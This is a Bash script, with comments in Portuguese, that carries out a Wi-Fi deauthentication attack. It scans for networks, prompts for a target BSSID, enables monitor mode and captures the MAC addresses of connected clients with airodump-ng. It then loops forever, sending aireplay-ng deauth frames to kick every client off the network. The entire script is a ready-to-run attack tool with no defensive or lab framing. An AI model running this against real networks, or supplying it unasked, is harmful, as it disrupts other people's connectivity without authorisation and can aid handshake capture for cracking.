#!/bin/bash

clear
echo -e "\033[0;32m          _  __ _           _                  _   _           _     \033[0m"
echo -e "\033[0;32m__      _(_)/ _(_)       __| | ___  __ _ _   _| |_| |__    ___| |__  \033[0m"
echo -e "\033[0;32m\ \ /\ / / | |_| |_____ / _  |/ _ \/ _  | | | | __|  _ \  / __|  _ \  \033[0m"
echo -e "\033[0;32m \ V  V /| |  _| |V 1.1| (_| |  __/ (_| | |_| | |_| | | |_\__ \ | | | \033[0m"
echo -e "\033[0;32m  \_/\_/ |_|_| |_|      \__ _|\___|\__ _|\__ _|\__|_| |_(_)___/_| |_| \033[0m"
echo -e "\033[0;32mInstagram: @rafael_cyber1\033[0m\n"

scan=$(nmcli dev wifi); echo -e "\033[0;32m$scan\033[0m"

# read ler ler a informação
echo -e "\n\033[0;32mTarget BSSID:\033[0m"
read bssid

echo -e "\n\033[0;32mWait 30 Seconds\033[0m\n"

result=$(nmcli dev wifi | grep "$bssid" | sed 's/^\* //' | sed 's/^ *//' | sed 's/ \{2,\}/ /g'); channel=$(echo "$result" | cut -d' ' -f4); interface=$(nmcli dev status | grep "wifi" | sed '/wifi-/d' | cut -d' ' -f1) # usa cut para extrair o primeiro campo o -f especifica qual sera o campo

start=$(airmon-ng start $interface)
mon=$(echo "${interface}mon") # adciona mon no nome da interface

# airodump-ng é executado em segundo plano (&), e o comando pid=$! captura o PID do processo em segundo plano para que possamos matá-lo depois.
# sleep 20: Dá 20 segundos para o airodump-ng coletar pacotes.
# kill $pid: Mata o processo do airodump-ng após o tempo especificado.


airodump-ng -c $channel --bssid $bssid $mon --output-format csv -w result-air > /dev/null 2>&1 & pid=$!; sleep 30; kill $pid; grep ":" result-air-01.csv | sed 's/,.*//' > list_macs.txt 2>/dev/null; rm result-air-01.csv >/dev/null 2>&1

# while true; do cria um loop infinito
# while cria um loop condicional. read lé e guarda o valor em mac que vai ser usado no aireplay-ng
# -r instrui o read a não interpretar caracteres de barra invertida (\) como caracteres especiais.
# do o loop continuará até que não haja mais entradas para ler ou até que o script seja interrompido.

echo -e "\033[0;32mStarting The Attack\033[0m\n"
sleep 5

while true; do
  while read -r mac; do
    air=$(aireplay-ng -0 1 -a $bssid -c $mac $mon); echo -e "\033[0;32m$air\033[0m"
    sleep 2
  done < list_macs.txt
done
